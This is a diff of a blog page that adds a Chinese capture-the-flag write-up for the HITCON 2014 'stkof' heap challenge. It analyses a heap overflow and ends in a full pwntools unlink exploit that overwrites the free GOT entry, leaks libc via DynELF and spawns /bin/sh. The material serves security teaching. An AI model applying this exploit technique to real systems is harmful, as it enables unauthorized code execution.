@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="unlink,writeup,pwn,how2heap,堆利用," />
 
 
 
@@ -81,13 +81,18 @@
 
 
 
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hpasserby">
-<meta property="og:url" content="https://hpasserby.github.io/tags/pwn/index.html">
+<meta name="description" content="题目描述题目来源：HITCON CTF 2014-stkof这道题没有菜单显示，只能通过分析代码来了解程序功能。">
+<meta name="keywords" content="unlink,writeup,pwn,how2heap,堆利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hitcon2014_stkof writeup">
+<meta property="og:url" content="https://hpasserby.github.io/post/e7616071.html">
 <meta property="og:site_name" content="Hpasserby">
+<meta property="og:description" content="题目描述题目来源：HITCON CTF 2014-stkof这道题没有菜单显示，只能通过分析代码来了解程序功能。">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-10-02T18:11:18.484Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hpasserby">
+<meta name="twitter:title" content="hitcon2014_stkof writeup">
+<meta name="twitter:description" content="题目描述题目来源：HITCON CTF 2014-stkof这道题没有菜单显示，只能通过分析代码来了解程序功能。">
 
 
 
@@ -117,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="https://hpasserby.github.io/tags/pwn/"/>
+  <link rel="canonical" href="https://hpasserby.github.io/post/e7616071.html"/>
 
 
 
 
 
-  <title>标签: pwn | Hpasserby</title>
+  <title>hitcon2014_stkof writeup | Hpasserby</title>
   
 
 
@@ -143,7 +148,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 	
 	<a href="https://github.com/Hpasserby"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
@@ -273,82 +278,212 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>pwn<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hpasserby.github.io/post/e7616071.html">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hpasserby">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hpasserby">
+    </span>
+
+    
+      <header class="post-header">
+
         
-            <a class="post-title-link" href="/post/e7616071.html" itemprop="url">
-              
-                <span itemprop="name">hitcon2014_stkof writeup</span>
-              
-            </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">hitcon2014_stkof writeup</h1>
+        
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-10-03T00:53:36+08:00"
-              content="2018-10-03" >
-          10-03
-        </time>
-      </div>
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-03T00:53:36+08:00">
+                2018-10-03
+              </time>
+            
 
-    </header>
-  </article>
+            
 
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/writeups/" itemprop="url" rel="index">
+                    <span itemprop="name">writeups</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/post/e7616071.html" class="leancloud_visitors" data-flag-title="hitcon2014_stkof writeup">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-        
+      
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/post/dbc7b210.html" itemprop="url">
-              
-                <span itemprop="name">堆利用学习之unlink</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated"
-              datetime="2018-09-29T21:10:54+08:00"
-              content="2018-09-29" >
-          09-29
-        </time>
-      </div>
-
-    </header>
-  </article>
-
+      
+        <h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>题目来源：HITCON CTF 2014-stkof<br>这道题没有菜单显示，只能通过分析代码来了解程序功能。<br><a id="more"></a></p>
+<p>功能：</p>
+<ol>
+<li>添加（输入：长度）</li>
+<li>修改（输入：索引、长度、内容）</li>
+<li>删除（输入：索引）</li>
+</ol>
+<p>程序保护情况：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/nick/pwn_learn/heapLearn/unlink/hitcon2014_stkof/stkof&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br></pre></td></tr></table></figure></p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>add函数中，对分配chunk的大小没有限制，将指针存到<strong>全局数组</strong>中，可获得指针变量的地址</p>
+<p>set函数中，<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __<span class="function">int64 <span class="title">set</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  __int64 n; <span class="comment">// [rsp+10h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+18h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+20h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v2 = atol(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0x100000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( !::s[v2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  n = atoll(&amp;s);</span><br><span class="line">  ptr = ::s[v2];</span><br><span class="line">  <span class="keyword">for</span> ( i = fread(ptr, <span class="number">1u</span>LL, n, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1u</span>LL, n, <span class="built_in">stdin</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    ptr += i;</span><br><span class="line">    n -= i;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( n )</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>对写入的长度没有限制，存在<strong>堆溢出</strong>，所以可以利用<strong>unlink漏洞</strong></p>
+<p>delete函数中，释放掉堆块并把指针清零0</p>
+<p>由于程序中没有可以用来输出数据的函数，于是考虑将puts函数覆写到其他函数的got表（这里选择free函数）</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
+<li>分配连续4个chunk（编号1-4），大小为0x80（smallchunk）（通常尽量多申请一个chunk，以隔开top chunk，防止被合并）</li>
+<li>在chunk1中构造fake chunk，<strong>准备unlink</strong><br><code>prevsize：0</code><br><code>size：0x80</code><br><code>fd：chunk_ptr - 0x18</code><br><code>bk：chunk_ptr - 0x10</code><br>注意：chunk_ptr是指向<code>chunk0的指针变量所在的地址</code>，而非指针指向的地址</li>
+<li>从chunk1继续溢出到chunk2，修改prevsize、size（inuse位）<br><code>prevsize: 0x80</code><br><code>size：0x90</code></li>
+<li>释放chunk2，触发unlink，此后chunk1的指针的值被修改为了chunk_ptr-0x18</li>
+<li>把free的got表修改为puts。<br><code>payload = p64(0)*3 + p64(chunk_ptr-0x18) + p64(free_got)</code><br><code>set(1, payload)</code><br><code>set(2, p64(puts))</code></li>
+<li>使用DynELF泄露system（详见代码）</li>
+<li>利用（5）的方法，再将free的got表修改为system</li>
+<li>向chunk3中写入<code>/bin/sh\x00</code>，释放chunk3，getshell</li>
+</ol>
+<h2 id="我的exp"><a href="#我的exp" class="headerlink" title="我的exp"></a>我的exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">p = process(<span class="string">'./stkof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./stkof'</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(chunk_ptr<span class="number">-0x18</span>) + p64(addr)</span><br><span class="line">    set(<span class="number">1</span>, payload)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    res = p.recvuntil(<span class="string">'OK\n'</span>).split(<span class="string">'\x0aOK'</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">if</span> res == <span class="string">''</span>:</span><br><span class="line">        res = <span class="string">'\x00'</span></span><br><span class="line">    <span class="keyword">return</span> res <span class="comment">#返回值可以为任意长度，并不清楚原因</span></span><br><span class="line"></span><br><span class="line">chunk_ptr = <span class="number">0x602148</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(chunk_ptr<span class="number">-0x18</span>) + p64(chunk_ptr<span class="number">-0x10</span>)</span><br><span class="line">payload += <span class="string">'a'</span> * <span class="number">0x60</span></span><br><span class="line">payload += p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">set(<span class="number">1</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'OK\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#freegot写为puts</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(chunk_ptr<span class="number">-0x18</span>) + p64(free_got)</span><br><span class="line">set(<span class="number">1</span>, payload)</span><br><span class="line">set(<span class="number">2</span>, p64(puts))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak</span></span><br><span class="line">d = DynELF(leak, elf = elf)</span><br><span class="line">system = d.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system addr: %#x"</span> % system</span><br><span class="line"></span><br><span class="line"><span class="comment">#freegot写为system</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(chunk_ptr<span class="number">-0x18</span>) + p64(free_got)</span><br><span class="line">set(<span class="number">1</span>, payload)</span><br><span class="line">set(<span class="number">2</span>, p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">set(<span class="number">3</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>题目链接：<a href="https://github.com/Hpasserby/pwn_learn/raw/master/heapLearn/unlink/hitcon2014_stkof/stkof" target="_blank" rel="noopener">stkof</a><br>相关题目：<a href="/post/503970b4.html">unlink例题</a><br>unlink漏洞分析：<a href="/post/dbc7b210.html">堆利用学习之unlink</a></p>
 
       
     </div>
+    
+    
+    
 
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/unlink/" rel="tag"># unlink</a>
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/how2heap/" rel="tag"># how2heap</a>
+          
+            <a href="/tags/堆利用/" rel="tag"># 堆利用</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/post/0.html" rel="next" title="">
+                <i class="fa fa-chevron-left"></i> 
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -356,6 +491,13 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
 
         </div>
         
@@ -376,8 +518,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -437,6 +588,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述"><span class="nav-number">1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#程序分析"><span class="nav-number">2.</span> <span class="nav-text">程序分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#我的exp"><span class="nav-number">4.</span> <span class="nav-text">我的exp</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -610,6 +777,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
